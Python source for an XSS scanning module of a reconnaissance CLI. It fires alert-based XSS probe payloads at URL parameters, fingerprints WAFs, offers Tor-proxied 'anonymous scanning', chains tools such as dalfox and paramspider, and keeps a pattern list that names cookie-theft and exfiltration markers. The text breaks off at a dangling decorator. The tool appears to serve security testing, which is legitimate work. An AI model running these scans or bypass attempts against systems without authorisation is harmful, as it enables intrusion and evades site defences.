#!/usr/bin/env python3

import os
import sys
import sqlite3
import shutil
import subprocess
import json
import csv
import urllib.parse
import time
from datetime import datetime, timedelta
from pathlib import Path

import click
import httpx

try:
    from reconcli.db import get_db_manager
    from reconcli.db.models import Vulnerability, VulnType, VulnSeverity, Target

    DB_AVAILABLE = True
except ImportError:
    DB_AVAILABLE = False

HOME = str(Path.home())
RECON_DIR = os.path.join(HOME, ".reconcli")
# Fallback SQLite DB for when main DB is not available
FALLBACK_DB_PATH = os.path.join(RECON_DIR, "xsscli.db")
DEFAULT_PAYLOADS = os.path.join(
    os.path.dirname(__file__), "payloads", "xss-advanced.txt"
)

BINARIES = [
    "dalfox",
    "gf",
    "playwright",
    "curl",
    "jq",
    "qsreplace",
    "kxss",
    "waybackurls",
    "unfurl",
    "linkfinder",
    "paramspider",
    "xsstrike",
    "httpx",
    "gau",
    "hakrawler",
    "gospider",
    "katana",
    "nuclei",
    "subfinder",
    "assetfinder",
    "gxss",
    "bxss",
    "freq",
    "anew",
    "rush",
    "parallel",
    "xargs",
    "chromedriver",
    "geckodriver",
    "playwright-python",
]

# XSS Categories for payload organization
XSS_CATEGORIES = {
    "basic": "Basic XSS payloads",
    "dom": "DOM-based XSS payloads",
    "reflected": "Reflected XSS payloads",
    "stored": "Stored XSS payloads",
    "blind": "Blind XSS payloads",
    "waf_bypass": "WAF bypass payloads",
    "csp_bypass": "CSP bypass payloads",
    "polyglot": "Polyglot XSS payloads",
    "modern": "Modern JavaScript XSS",
    "custom": "Custom user payloads",
}

os.makedirs(RECON_DIR, exist_ok=True)


def ai_analyze_xss_results(results, query="", target_info=None):
    """AI-powered analysis of XSS test results"""
    if not results:
        return "No XSS results to analyze"

    analysis = []
    analysis.append(f"🤖 AI XSS Analysis for query: '{query}'")
    analysis.append("=" * 60)

    # Overall statistics
    total_tests = len(results)
    vulnerable_count = len([r for r in results if r.get("vulnerable", False)])
    reflected_count = len([r for r in results if r.get("reflected", False)])

    analysis.append(f"📊 Test Results Summary:")
    analysis.append(f"  Total tests performed: {total_tests}")
    analysis.append(f"  Vulnerable findings: {vulnerable_count}")
    analysis.append(f"  Reflected payloads: {reflected_count}")

    if total_tests > 0:
        vuln_rate = (vulnerable_count / total_tests) * 100
        refl_rate = (reflected_count / total_tests) * 100
        analysis.append(f"  Vulnerability rate: {vuln_rate:.1f}%")
        analysis.append(f"  Reflection rate: {refl_rate:.1f}%")

    # Parameter analysis
    params = {}
    methods = {}
    payloads_success = {}
    response_codes = {}

    for result in results:
        # Parameter frequency
        param = result.get("param", "unknown")
        params[param] = params.get(param, 0) + 1

        # Method analysis
        method = result.get("method", "GET")
        methods[method] = methods.get(method, 0) + 1

        # Successful payload analysis
        if result.get("vulnerable", False):
            payload = (
                result.get("payload", "")[:50] + "..."
                if len(result.get("payload", "")) > 50
                else result.get("payload", "")
            )
            payloads_success[payload] = payloads_success.get(payload, 0) + 1

        # Response code analysis
        code = result.get("response_code", "unknown")
        response_codes[str(code)] = response_codes.get(str(code), 0) + 1

    # Top vulnerable parameters
    analysis.append(f"\n🎯 Parameter Analysis:")
    top_params = sorted(params.items(), key=lambda x: x[1], reverse=True)[:5]
    for param, count in top_params:
        percentage = (count / total_tests) * 100
        analysis.append(f"  {param}: {count} tests ({percentage:.1f}%)")

    # HTTP Methods
    analysis.append(f"\n📡 HTTP Methods Used:")
    for method, count in sorted(methods.items(), key=lambda x: x[1], reverse=True):
        percentage = (count / total_tests) * 100
        analysis.append(f"  {method}: {count} ({percentage:.1f}%)")

    # Most successful payloads
    if payloads_success:
        analysis.append(f"\n💥 Most Successful Payloads:")
        top_payloads = sorted(
            payloads_success.items(), key=lambda x: x[1], reverse=True
        )[:5]
        for payload, count in top_payloads:
            analysis.append(f"  {count}x: {payload}")

    # Response code analysis
    analysis.append(f"\n📈 Response Code Distribution:")
    top_codes = sorted(response_codes.items(), key=lambda x: x[1], reverse=True)[:5]
    for code, count in top_codes:
        percentage = (count / total_tests) * 100
        analysis.append(f"  HTTP {code}: {count} ({percentage:.1f}%)")

    # Security insights
    analysis.append(f"\n🔒 Security Insights:")

    # Check for dangerous patterns
    dangerous_patterns = {
        "script_execution": ["<script>", "javascript:", "onerror=", "onload="],
        "dom_manipulation": ["document.", "window.", "eval(", "innerHTML"],
        "data_exfiltration": [
            "fetch(",
            "XMLHttpRequest",
            "location.href",
            "document.cookie",
        ],
        "event_handlers": ["onclick=", "onmouseover=", "onfocus=", "ontoggle="],
        "iframe_injection": ["<iframe", "<object", "<embed", "data:"],
    }

    pattern_matches = {}
    for result in results:
        if result.get("vulnerable", False):
            payload = result.get("payload", "").lower()
            for category, patterns in dangerous_patterns.items():
                for pattern in patterns:
                    if pattern in payload:
                        pattern_matches[category] = pattern_matches.get(category, 0) + 1
                        break

    if pattern_matches:
        analysis.append(f"  ⚠️  Dangerous XSS patterns detected:")
        for category, count in sorted(
            pattern_matches.items(), key=lambda x: x[1], reverse=True
        ):
            analysis.append(
                f"    {category.replace('_', ' ').title()}: {count} instances"
            )
    else:
        analysis.append(
            f"  ✅ No immediately dangerous patterns in successful payloads"
        )

    # WAF/Filter analysis
    blocked_indicators = [
        "403",
        "406",
        "429",
        "503",
        "blocked",
        "forbidden",
        "filtered",
    ]
    blocked_count = 0
    for result in results:
        response_code = str(result.get("response_code", ""))
        if any(indicator in response_code.lower() for indicator in blocked_indicators):
            blocked_count += 1

    if blocked_count > 0:
        block_rate = (blocked_count / total_tests) * 100
        analysis.append(
            f"  🛡️  Potential WAF/filtering detected: {blocked_count} blocked ({block_rate:.1f}%)"
        )

    # Recommendations
    analysis.append(f"\n💡 Recommendations:")

    if vulnerable_count > 0:
        analysis.append(f"  🚨 CRITICAL: {vulnerable_count} XSS vulnerabilities found!")
        analysis.append(f"  - Implement proper input validation and output encoding")
        analysis.append(f"  - Use Content Security Policy (CSP) headers")
        analysis.append(f"  - Consider implementing XSS protection headers")

        if "document.cookie" in str(results):
            analysis.append(
                f"  - Implement HttpOnly cookie flags to prevent cookie theft"
            )

        if any("script_execution" in str(r) for r in results):
            analysis.append(f"  - Review all user input points for script injection")
    else:
        analysis.append(f"  ✅ No XSS vulnerabilities detected in this scan")
        analysis.append(f"  - Continue regular security testing")
        analysis.append(f"  - Consider testing with more advanced payloads")

    if reflected_count > vulnerable_count:
        analysis.append(f"  ⚠️  Some payloads reflected but not confirmed vulnerable")
        analysis.append(f"  - Manual verification recommended for reflected payloads")

    # Advanced recommendations based on patterns
    if "dom_manipulation" in pattern_matches:
        analysis.append(f"  - Review client-side JavaScript for DOM-based XSS")

    if blocked_count > total_tests * 0.3:  # More than 30% blocked
        analysis.append(f"  - WAF detected - consider advanced bypass techniques")
        analysis.append(f"  - Test with encoded and obfuscated payloads")

    # Target-specific insights
    if target_info:
        analysis.append(f"\n🎯 Target-Specific Insights:")
        if "waf" in target_info:
            analysis.append(f"  - WAF detected: {target_info['waf']}")
        if "technologies" in target_info:
            analysis.append(
                f"  - Technologies: {', '.join(target_info['technologies'])}"
            )

    return "\n".join(analysis)


def setup_tor_proxy(tor_proxy_url):
    """Setup httpx client with Tor proxy"""
    try:
        import httpx

        print(f"[*] Setting up Tor proxy: {tor_proxy_url}")

        # Create client with proxy configuration
        client = httpx.Client(
            timeout=15,
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0"
            },
        )

        # For now, return basic client as httpx proxy support might need specific setup
        # In production, you might want to use different approach
        print(
            f"[*] Tor proxy setup initiated (Note: Full proxy support may require additional configuration)"
        )

        # Test basic connectivity first
        try:
            response = client.get("https://httpbin.org/ip", timeout=10)
            if response.status_code == 200:
                print(f"[+] Basic connectivity test passed")
                return client
            else:
                print(f"[!] Connectivity test failed")
        except Exception as e:
            print(f"[!] Connectivity test error: {e}")

        return client

    except Exception as e:
        print(f"[!] Error setting up Tor proxy: {e}")
        print(f"[*] Make sure Tor is running and accessible at {tor_proxy_url}")
        return None


def init_db():
    """Initialize the SQLite database with comprehensive tables."""
    if DB_AVAILABLE:
        # Use main ReconCLI database
        try:
            db = get_db_manager()
            # Database is automatically initialized
            print("[*] Using main ReconCLI database")
            return
        except Exception as e:
            print(f"[!] Error with main database: {e}")
            print("[*] Falling back to local database")

    # Fallback to local SQLite database
    conn = sqlite3.connect(FALLBACK_DB_PATH)
    c = conn.cursor()

    # Custom payloads table for fallback
    c.execute(
        """
        CREATE TABLE IF NOT EXISTS custom_payloads (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            payload TEXT NOT NULL,
            category TEXT,
            description TEXT,
            active INTEGER DEFAULT 1,
            success_rate REAL DEFAULT 0.0,
            times_used INTEGER DEFAULT 0,
            added_date TEXT,
            tags TEXT
        )
    """
    )

    # Basic results table for fallback
    c.execute(
        """
        CREATE TABLE IF NOT EXISTS results (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            url TEXT NOT NULL,
            param TEXT,
            payload TEXT,
            reflected INTEGER DEFAULT 0,
            vulnerable INTEGER DEFAULT 0,
            method TEXT DEFAULT 'GET',
            response_code INTEGER,
            response_length INTEGER,
            timestamp TEXT,
            tool_used TEXT,
            severity TEXT DEFAULT 'low',
            notes TEXT
        )
    """
    )

    # Blind XSS callback URLs table
    c.execute(
        """
        CREATE TABLE IF NOT EXISTS blind_callbacks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            url TEXT NOT NULL,
            description TEXT,
            active INTEGER DEFAULT 1,
            added_date TEXT,
            last_used TEXT,
            times_used INTEGER DEFAULT 0
        )
    """
    )

    conn.commit()
    conn.close()


def check_binary(binary_name):
    """Check if binary exists in PATH."""
    return shutil.which(binary_name) is not None


def save_result(
    url,
    param=None,
    payload=None,
    reflected=False,
    vulnerable=False,
    method="GET",
    response_code=None,
    response_length=None,
    tool_used=None,
    severity="low",
    notes=None,
):
    """Save XSS test result to database."""
    if DB_AVAILABLE:
        try:
            db = get_db_manager()
            session = db.get_session()

            # Get or create target
            target = (
                session.query(Target)
                .filter_by(domain=url.split("/")[2] if "://" in url else url)
                .first()
            )
            if not target:
                target = Target(domain=url.split("/")[2] if "://" in url else url)
                session.add(target)
                session.commit()

            # Create vulnerability record if vulnerable
            if vulnerable:
                vuln = Vulnerability(
                    target_id=target.id,
                    url=url,
                    vuln_type=VulnType.XSS,
                    severity=(
                        VulnSeverity.MEDIUM
                        if severity == "medium"
                        else VulnSeverity.LOW
                    ),
                    title=f"XSS vulnerability found via {tool_used or 'manual'}",
                    description=f"Parameter: {param}, Payload: {payload}",
                    discovery_tool=tool_used or "xsscli",
                    payload=payload,
                    status="new",
                )
                session.add(vuln)

            session.commit()
            session.close()
            return

        except Exception as e:
            print(f"[!] Error saving to main database: {e}")
            print("[*] Falling back to local database")

    # Fallback to local SQLite database
    conn = sqlite3.connect(FALLBACK_DB_PATH)
    c = conn.cursor()

    timestamp = datetime.now().isoformat()

    c.execute(
        """
        INSERT INTO results 
        (url, param, payload, reflected, vulnerable, method, response_code, 
         response_length, timestamp, tool_used, severity, notes)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """,
        (
            url,
            param,
            payload,
            int(reflected),
            int(vulnerable),
            method,
            response_code,
            response_length,
            timestamp,
            tool_used,
            severity,
            notes,
        ),
    )

    conn.commit()
    conn.close()


@click.group()
def cli():
    """[XSSCLI] Advanced XSS module for ReconCLI"""
    init_db()


@cli.command()
@click.option(
    "--format",
    type=click.Choice(["json", "csv", "txt"]),
    required=True,
    help="Export format",
)
@click.option("--output", required=True, help="Output file path")
def export(format, output):
    """Export stored results to file."""
    rows = []

    if DB_AVAILABLE:
        try:
            db = get_db_manager()
            session = db.get_session()

            # Query vulnerabilities from main database
            vulns = session.query(Vulnerability).filter_by(vuln_type=VulnType.XSS).all()
            rows = []
            for vuln in vulns:
                rows.append(
                    [
                        vuln.url,
                        (
                            vuln.description.split("Parameter: ")[1].split(",")[0]
                            if "Parameter: " in (vuln.description or "")
                            else None
                        ),
                        vuln.payload,
                        True,  # reflected (assume true for stored vulns)
                        vuln.discovered_date.isoformat(),
                    ]
                )
            session.close()

        except Exception as e:
            print(f"[!] Error reading from main database: {e}")
            print("[*] Falling back to local database")
            # Fall through to fallback logic

    # Fallback or if main DB failed
    if not rows:
        conn = sqlite3.connect(FALLBACK_DB_PATH)
        c = conn.cursor()
        c.execute("SELECT url, param, payload, reflected, timestamp FROM results")
        rows = c.fetchall()
        conn.close()

    if format == "json":
        with open(output, "w") as f:
            json.dump(
                [
                    {
                        "url": r[0],
                        "param": r[1],
                        "payload": r[2],
                        "reflected": bool(r[3]),
                        "timestamp": r[4],
                    }
                    for r in rows
                ],
                f,
                indent=2,
            )
        print(f"[*] Exported {len(rows)} records to {output} (JSON)")

    elif format == "csv":
        with open(output, "w", newline="") as f:
            writer = csv.writer(f)
            writer.writerow(["url", "param", "payload", "reflected", "timestamp"])
            writer.writerows(rows)
        print(f"[*] Exported {len(rows)} records to {output} (CSV)")

    elif format == "txt":
        with open(output, "w") as f:
            for r in rows:
                line = f"{r[0]} | {r[1]} | {r[2]} | Reflected: {bool(r[3])} | {r[4]}\n"
                f.write(line)
        print(f"[*] Exported {len(rows)} records to {output} (TXT)")


@cli.command()
def check_deps():
    """Check for required external binaries."""
    print("[i] Checking external binaries:")
    missing = []
    found = []

    for binary in BINARIES:
        if shutil.which(binary) is None:
            print(f"[!] Missing: {binary}")
            missing.append(binary)
        else:
            print(f"[+] Found: {binary}")
            found.append(binary)

    print(f"\n[*] Summary: {len(found)} found, {len(missing)} missing")

    if missing:
        print("\n[*] Install missing tools:")
        go_tools = ["dalfox", "kxss", "waybackurls", "gau", "hakrawler", "gospider"]
        for tool in missing:
            if tool in go_tools:
                print(f"  go install github.com/author/{tool}@latest")
            else:
                print(f"  # Install {tool} from its repository")


@cli.command()
@click.option(
    "--input", required=True, help="Input file with URLs or single domain/URL"
)
@click.option("--param", help="Parameter to test (optional)")
@click.option("--payloads-file", help="Custom payloads file")
@click.option("--method", default="GET", help="HTTP method")
@click.option("--delay", default=1, type=float, help="Delay between requests")
@click.option("--threads", default=5, type=int, help="Number of concurrent threads")
@click.option("--output", help="Output file for results")
@click.option(
    "--format",
    type=click.Choice(["json", "csv", "txt"]),
    default="txt",
    help="Output format",
)
@click.option("--ai", is_flag=True, help="Enable AI-powered analysis of XSS results")
@click.option("--tor", is_flag=True, help="Use Tor proxy for anonymous scanning")
@click.option("--tor-proxy", default="socks5://127.0.0.1:9050", help="Tor proxy URL")
def test_input(
    input,
    param,
    payloads_file,
    method,
    delay,
    threads,
    output,
    format,
    ai,
    tor,
    tor_proxy,
):
    """Test XSS on URLs from file or single domain/URL."""
    targets = []

    # Check if input is a file or a single URL/domain
    if os.path.exists(input):
        print(f"[*] Loading URLs from file: {input}")
        with open(input, "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    # Ensure URL has protocol
                    if not line.startswith(("http://", "https://")):
                        line = "https://" + line
                    targets.append(line)
    else:
        # Treat as single domain/URL
        print(f"[*] Testing single target: {input}")
        if not input.startswith(("http://", "https://")):
            input = "https://" + input
        targets.append(input)

    if not targets:
        print("[!] No targets found")
        return

    print(f"[*] Found {len(targets)} targets to test")

    # Load payloads
    payloads = []
    if payloads_file and os.path.exists(payloads_file):
        print(f"[*] Loading payloads from: {payloads_file}")
        with open(payloads_file) as f:
            payloads = [
                line.strip() for line in f if line.strip() and not line.startswith("#")
            ]
    else:
        # Default XSS payloads
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "'><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<details open ontoggle=alert('XSS')>",
        ]

    print(f"[*] Using {len(payloads)} XSS payloads")
    print(f"[*] Method: {method} | Delay: {delay}s | Threads: {threads}")

    if tor:
        print(f"[*] Setting up Tor proxy for anonymous scanning...")
        tor_client = setup_tor_proxy(tor_proxy)
        if not tor_client:
            print(f"[!] Failed to setup Tor proxy. Proceeding without Tor.")
            tor = False

    results = []
    vulnerable_count = 0

    for i, target in enumerate(targets, 1):
        print(f"\n[*] Testing target {i}/{len(targets)}: {target}")

        try:
            # Use Tor client if available, otherwise regular client
            if tor and "tor_client" in locals():
                client = tor_client
            else:
                client = httpx.Client(timeout=10)

            with client:
                for j, payload in enumerate(payloads, 1):
                    print(f"  [*] Payload {j}/{len(payloads)}: {payload[:50]}...")

                    try:
                        if method.upper() == "GET":
                            if param:
                                test_url = (
                                    f"{target}?{param}={urllib.parse.quote(payload)}"
                                )
                            else:
                                test_url = (
                                    f"{target}?xss_test={urllib.parse.quote(payload)}"
                                )

                            response = client.get(test_url)
                            actual_url = test_url
                        else:
                            data = {}
                            if param:
                                data[param] = payload
                            else:
                                data["xss_test"] = payload

                            response = client.post(target, data=data)
                            actual_url = target

                        # Check if payload is reflected in response
                        reflected = payload in response.text
                        vulnerable = reflected  # Basic check - could be enhanced

                        if reflected:
                            print(f"    [+] REFLECTED: {payload[:30]}...")
                            vulnerable_count += 1

                        # Store result
                        result = {
                            "url": actual_url,
                            "target": target,
                            "param": param or "xss_test",
                            "payload": payload,
                            "method": method,
                            "reflected": reflected,
                            "vulnerable": vulnerable,
                            "response_code": response.status_code,
                            "response_length": len(response.text),
                            "timestamp": datetime.now().isoformat(),
                            "tor_used": tor,
                        }

                        results.append(result)

                        # Save to database
                        save_result(
                            actual_url,
                            param or "xss_test",
                            payload,
                            reflected,
                            vulnerable,
                            method,
                            response.status_code,
                            len(response.text),
                            "test_input",
                            "medium" if vulnerable else "low",
                            f"Tor: {tor}, Target: {target}",
                        )

                    except Exception as e:
                        print(f"    [!] Error with payload: {e}")
                        continue

                    time.sleep(delay)

        except Exception as e:
            print(f"[!] Error testing target {target}: {e}")
            continue

    print(f"\n[+] Testing completed!")
    print(f"[+] Tested {len(targets)} targets with {len(payloads)} payloads each")
    print(f"[+] Found {vulnerable_count} reflected payloads")
    print(f"[+] Found {len(results)} total test results")

    if tor:
        print(f"[+] All requests made through Tor proxy")

    # AI Analysis
    if ai and results:
        print(f"\n" + "=" * 60)
        print(f"🤖 AI ANALYSIS")
        print(f"=" * 60)

        target_info = {
            "tor_used": tor,
            "targets_count": len(targets),
            "payloads_count": len(payloads),
        }

        ai_analysis = ai_analyze_xss_results(results, input, target_info)
        print(ai_analysis)
        print(f"=" * 60)

    # Save results to output file if specified
    if output and results:
        if format == "json":
            with open(output, "w") as f:
                json.dump(results, f, indent=2)
        elif format == "csv":
            with open(output, "w", newline="") as f:
                writer = csv.DictWriter(f, fieldnames=results[0].keys())
                writer.writeheader()
                writer.writerows(results)
        else:  # txt
            with open(output, "w") as f:
                for r in results:
                    f.write(f"URL: {r['url']}\n")
                    f.write(f"Parameter: {r.get('param', 'N/A')}\n")
                    f.write(f"Payload: {r['payload']}\n")
                    f.write(f"Reflected: {r['reflected']}\n")
                    f.write(f"Vulnerable: {r['vulnerable']}\n")
                    f.write(f"Response Code: {r.get('response_code', 'N/A')}\n")
                    f.write(f"Tor Used: {r.get('tor_used', False)}\n")
                    f.write(f"Timestamp: {r['timestamp']}\n")
                    f.write("-" * 80 + "\n")

        print(f"[*] Results saved to: {output}")


@cli.command()
@click.option("--url", required=True, help="URL to test for WAF")
@click.option("--output", help="Output file for WAF detection results")
def detect_waf(url, output):
    """Detect Web Application Firewall (WAF) on target URL."""
    print(f"[*] Detecting WAF on {url}")

    waf_signatures = {
        "cloudflare": ["cloudflare", "cf-ray", "__cfduid"],
        "aws": ["x-amzn-requestid", "x-amz-"],
        "fastly": ["fastly-debug-digest", "x-served-by"],
        "incapsula": ["incap_ses", "visid_incap"],
        "akamai": ["akamai", "x-akamai"],
        "sucuri": ["x-sucuri-id", "sucuri"],
        "mod_security": ["mod_security", "modsecurity"],
        "barracuda": ["barra"],
        "f5": ["f5-"],
        "citrix": ["citrix", "netscaler"],
    }

    detected_wafs = []

    try:
        with httpx.Client(timeout=10) as client:
            # Test with normal request
            response = client.get(url)
            headers = {k.lower(): v.lower() for k, v in response.headers.items()}

            # Check headers for WAF signatures
            for waf, signatures in waf_signatures.items():
                for sig in signatures:
                    if any(sig in h for h in headers.keys()) or any(
                        sig in v for v in headers.values()
                    ):
                        detected_wafs.append(waf)
                        break

            # Test with malicious payload
            test_payload = "<script>alert('xss')</script>"
            try:
                mal_response = client.get(f"{url}?test={test_payload}")
                if mal_response.status_code in [403, 406, 429, 501, 503]:
                    detected_wafs.append("unknown_waf")
            except (httpx.RequestError, httpx.HTTPStatusError) as e:
                print(f"[!] WAF test request failed: {e}")
                # Continue without WAF detection from malicious payload

    except Exception as e:
        print(f"[!] Error testing WAF: {e}")
        return

    # Save results to database
    if DB_AVAILABLE:
        try:
            db = get_db_manager()
            session = db.get_session()
            timestamp = datetime.now().isoformat()

            # Note: WAF detection could be stored as a custom table or in notes
            # For now, we'll just print the results
            session.close()

        except Exception as e:
            print(f"[!] Error with main database: {e}")

    # For WAF detection, we don't need to store in fallback DB for now
    # This is more of a reconnaissance step

    if detected_wafs:
        print(f"[+] Detected WAFs: {', '.join(set(detected_wafs))}")
        if output:
            with open(output, "w") as f:
                f.write("\n".join(set(detected_wafs)))
    else:
        print("[*] No WAF detected")


@cli.command()
@click.option("--payload", required=True, help="XSS payload to add")
@click.option("--category", help="Payload category")
@click.option("--description", help="Payload description")
@click.option("--tags", help="Comma-separated tags")
def add_payload(payload, category, description, tags):
    """Add custom XSS payload to database."""
    # Always use fallback database for custom payloads
    # This is local user data, not reconnaissance results
    conn = sqlite3.connect(FALLBACK_DB_PATH)
    c = conn.cursor()

    timestamp = datetime.now().isoformat()

    c.execute(
        """
        INSERT INTO custom_payloads 
        (payload, category, description, tags)
        VALUES (?, ?, ?, ?)
    """,
        (payload, category or "custom", description, tags),
    )

    conn.commit()
    conn.close()

    print(f"[+] Added payload to database: {payload[:50]}...")


@cli.command()
@click.option("--category", help="Filter by category")
@click.option("--active-only", is_flag=True, help="Show only active payloads")
def list_payloads(category, active_only):
    """List custom payloads from database."""
    # Always use fallback database for custom payloads
    conn = sqlite3.connect(FALLBACK_DB_PATH)
    c = conn.cursor()

    query = "SELECT * FROM custom_payloads WHERE 1=1"
    params = []

    if category:
        query += " AND category = ?"
        params.append(category)

    if active_only:
        query += " AND active = 1"

    query += " ORDER BY success_rate DESC, times_used DESC"

    c.execute(query, params)
    payloads = c.fetchall()
    conn.close()

    if payloads:
        print(f"[*] Found {len(payloads)} payloads:")
        for p in payloads:
            status = "Active" if p[4] else "Inactive"
            print(f"ID: {p[0]} | Category: {p[2]} | {status}")
            print(f"Payload: {p[1][:80]}...")
            if p[3]:  # description
                print(f"Description: {p[3]}")
            print(f"Success Rate: {p[5]:.2f} | Used: {p[6]} times")
            print("-" * 80)
    else:
        print("[*] No payloads found")


@cli.command()
@click.option("--url", required=True, help="URL to test")
@click.option("--param", help="Parameter to test")
@click.option("--payloads-file", help="Custom payloads file")
@click.option("--method", default="GET", help="HTTP method")
@click.option("--delay", default=1, type=float, help="Delay between requests")
@click.option("--ai", is_flag=True, help="Enable AI-powered analysis of results")
@click.option("--tor", is_flag=True, help="Use Tor proxy for anonymous testing")
@click.option("--tor-proxy", default="socks5://127.0.0.1:9050", help="Tor proxy URL")
def manual_test(url, param, payloads_file, method, delay, ai, tor, tor_proxy):
    """Manual XSS testing with custom payloads."""
    payloads = []

    # Load payloads
    if payloads_file and os.path.exists(payloads_file):
        with open(payloads_file) as f:
            payloads = [
                line.strip() for line in f if line.strip() and not line.startswith("#")
            ]
    else:
        # Default payloads
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "'><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
        ]

    print(f"[*] Testing {len(payloads)} payloads on {url}")
    vulnerable_payloads = []

    try:
        with httpx.Client(timeout=10) as client:
            for i, payload in enumerate(payloads, 1):
                print(f"[*] Testing payload {i}/{len(payloads)}: {payload[:50]}...")

                if method.upper() == "GET":
                    if param:
                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                    else:
                        test_url = f"{url}?test={urllib.parse.quote(payload)}"

                    try:
                        response = client.get(test_url)
                        if payload in response.text:
                            print(f"[+] REFLECTED: {payload}")
                            vulnerable_payloads.append(payload)
                            save_result(
                                test_url,
                                param,
                                payload,
                                reflected=True,
                                tool_used="manual_test",
                                response_code=response.status_code,
                            )
                    except Exception as e:
                        print(f"[!] Error testing payload: {e}")

                time.sleep(delay)

    except Exception as e:
        print(f"[!] Error during testing: {e}")

    print(
        f"\n[*] Testing completed. Found {len(vulnerable_payloads)} reflected payloads."
    )


@cli.command()
@click.option("--target", required=True, help="Target domain/URL")
@click.option("--output", help="Output directory")
@click.option("--threads", default=20, help="Number of threads")
@click.option("--ai", is_flag=True, help="Enable AI-powered analysis of scan results")
@click.option("--tor", is_flag=True, help="Use Tor proxy for anonymous scanning")
@click.option("--tor-proxy", default="socks5://127.0.0.1:9050", help="Tor proxy URL")
def full_scan(target, output, threads, ai, tor, tor_proxy):
    """Full XSS scanning pipeline with multiple tools."""
    print(f"[*] Starting full XSS scan on {target}")

    # Create output directory
    if not output:
        output = f"xss_scan_{target.replace('://', '_').replace('/', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"

    os.makedirs(output, exist_ok=True)

    # Step 1: URL Discovery
    print("[*] Phase 1: URL Discovery")
    urls_file = os.path.join(output, "urls.txt")

    if check_binary("gau"):
        print("[*] Running gau for URL discovery...")
        with open(urls_file, "w") as f:
            subprocess.run(["gau", target], stdout=f, stderr=subprocess.DEVNULL)

    if check_binary("waybackurls"):
        print("[*] Running waybackurls...")
        with open(urls_file, "a") as f:
            subprocess.run(["waybackurls", target], stdout=f, stderr=subprocess.DEVNULL)

    if check_binary("hakrawler"):
        print("[*] Running hakrawler...")
        with open(urls_file, "a") as f:
            subprocess.run(
                ["hakrawler", "-url", target, "-depth", "2"],
                stdout=f,
                stderr=subprocess.DEVNULL,
            )

    # Step 2: Parameter Discovery
    print("[*] Phase 2: Parameter Discovery")
    if check_binary("paramspider"):
        print("[*] Running paramspider...")
        subprocess.run(
            ["paramspider", "--domain", target, "--output", output],
            stderr=subprocess.DEVNULL,
        )

    # Step 3: XSS Testing
    print("[*] Phase 3: XSS Testing")
    if os.path.exists(urls_file):
        if check_binary("dalfox"):
            print("[*] Running Dalfox...")
            dalfox_output = os.path.join(output, "dalfox_results.txt")
            with open(dalfox_output, "w") as f:
                subprocess.run(
                    ["dalfox", "file", urls_file, "--worker", str(threads)],
                    stdout=f,
                    stderr=subprocess.DEVNULL,
                )

        if check_binary("kxss"):
            print("[*] Running kxss...")
            kxss_output = os.path.join(output, "kxss_results.txt")
            with open(urls_file) as input_f, open(kxss_output, "w") as output_f:
                subprocess.run(
                    ["kxss"], stdin=input_f, stdout=output_f, stderr=subprocess.DEVNULL
                )

    print(f"[+] Full scan completed. Results saved in {output}/")


@cli.command()
def stats():
    """Show XSS testing statistics."""
    if DB_AVAILABLE:
        try:
            db = get_db_manager()
            session = db.get_session()

            # Get XSS vulnerabilities from main database
            total_vulns = (
                session.query(Vulnerability).filter_by(vuln_type=VulnType.XSS).count()
            )
            critical_vulns = (
                session.query(Vulnerability)
                .filter_by(vuln_type=VulnType.XSS, severity=VulnSeverity.CRITICAL)
                .count()
            )
            high_vulns = (
                session.query(Vulnerability)
                .filter_by(vuln_type=VulnType.XSS, severity=VulnSeverity.HIGH)
                .count()
            )

            # Recent activity (last 7 days)
            week_ago = datetime.now() - timedelta(days=7)
            recent_vulns = (
                session.query(Vulnerability)
                .filter(
                    Vulnerability.vuln_type == VulnType.XSS,
                    Vulnerability.discovered_date >= week_ago,
                )
                .count()
            )

            session.close()

            print("=== XSS Testing Statistics (Main Database) ===")
            print(f"Total XSS vulnerabilities: {total_vulns}")
            print(f"Critical severity: {critical_vulns}")
            print(f"High severity: {high_vulns}")
            print(f"Found this week: {recent_vulns}")

            return

        except Exception as e:
            print(f"[!] Error reading from main database: {e}")
            print("[*] Falling back to local database")

    # Fallback to local database
    conn = sqlite3.connect(FALLBACK_DB_PATH)
    c = conn.cursor()

    # Basic stats
    c.execute("SELECT COUNT(*) FROM results")
    total_tests = c.fetchone()[0]

    c.execute("SELECT COUNT(*) FROM results WHERE vulnerable = 1")
    vulnerable_found = c.fetchone()[0]

    c.execute("SELECT COUNT(*) FROM results WHERE reflected = 1")
    reflected_found = c.fetchone()[0]

    c.execute("SELECT COUNT(DISTINCT url) FROM results")
    unique_urls = c.fetchone()[0]

    # Tool usage stats
    c.execute(
        "SELECT tool_used, COUNT(*) FROM results GROUP BY tool_used ORDER BY COUNT(*) DESC"
    )
    tool_stats = c.fetchall()

    # Recent activity
    c.execute(
        "SELECT COUNT(*) FROM results WHERE timestamp > ?",
        ((datetime.now() - timedelta(days=7)).isoformat(),),
    )
    recent_tests = c.fetchone()[0]

    conn.close()

    print("=== XSS Testing Statistics (Fallback Database) ===")
    print(f"Total tests performed: {total_tests}")
    print(f"Vulnerable findings: {vulnerable_found}")
    print(f"Reflected payloads: {reflected_found}")
    print(f"Unique URLs tested: {unique_urls}")
    print(f"Tests this week: {recent_tests}")

    if total_tests > 0:
        success_rate = (vulnerable_found / total_tests) * 100
        print(f"Success rate: {success_rate:.2f}%")

    if tool_stats:
        print("\n=== Tool Usage ===")
        for tool, count in tool_stats:
            print(f"{tool}: {count} tests")


@cli.command()
